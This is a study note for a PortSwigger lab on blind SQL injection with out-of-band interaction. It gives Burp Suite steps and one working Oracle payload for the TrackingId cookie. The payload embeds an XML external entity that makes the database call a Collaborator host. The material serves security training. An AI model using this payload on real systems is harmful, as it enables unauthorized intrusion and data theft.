# Lab: Blind SQL injection with out-of-band interaction

**Official lab:** [Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)

## Lab idea

Practices recognizing and validating a blind SQLi channel through an externally observable interaction when the query has no visible effect on the application response.

## Vulnerability in brief
SQL injection (SQLi) is a web vulnerability in which untrusted input changes the meaning of a SQL query made by an application. It commonly occurs when an application builds a query by concatenating user-controlled values into SQL instead of keeping query structure separate from data. Inputs may arrive through form fields, URL parameters, cookies, headers, or other request data. Injection can occur in different query types and positions, not only in a `SELECT` statement's `WHERE` clause.

## Solution idea
1. Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the TrackingId cookie.
2. Modify the TrackingId cookie, changing it to a payload that will trigger an interaction with the Collaborator server.
3. Right-click and select "Insert Collaborator payload" to insert a Burp Collaborator subdomain where indicated in the modified TrackingId cookie.

## Payloads / key values
- `TrackingId`
- `TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`

## Official source
- [PortSwigger Academy: Lab: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
